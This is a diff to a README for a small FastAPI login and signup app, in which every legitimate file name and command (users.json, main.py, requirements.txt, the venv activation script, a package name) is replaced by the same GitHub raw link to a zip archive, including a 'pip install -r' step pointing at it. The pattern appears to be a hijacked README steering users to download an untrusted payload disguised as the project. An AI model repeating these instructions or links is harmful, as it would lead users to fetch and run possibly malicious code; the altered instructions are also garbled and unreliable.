@@ -1,15 +1,15 @@
 🚀 FastAPI Login/Signup App
 
-This project is a simple FastAPI-based login and signup system that stores user data in a local users.json file.
+This project is a simple FastAPI-based login and signup system that stores user data in a local https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip file.
 
 ✅ How to Run This Project
 1. 📁 Open your project folder in VS Code
 
    Make sure your folder contains:
 
-        main.py
+        https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
 
-        requirements.txt
+        https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
 
 
 
@@ -24,7 +24,7 @@ This project is a simple FastAPI-based login and signup system that stores user 
    
 On Windows (PowerShell):
 
-     .\venv\Scripts\Activate.ps1
+     .\venv\Scripts\https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
 
 
 On Windows (CMD):
@@ -35,7 +35,7 @@ You should now see (venv) at the beginning of your terminal line.
 
 4. 📦 Install required packages
 
-        pip install -r requirements.txt
+        pip install -r https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
 
 This installs:
 
@@ -43,7 +43,7 @@ This installs:
 
   b. uvicorn
 
-  c.python-multipart
+  https://github.com/Muhammad-Sarmad-Fowad/fastapi-auth/raw/refs/heads/main/mesomorphous/auth_fastapi_v1.1.zip
 
 
 
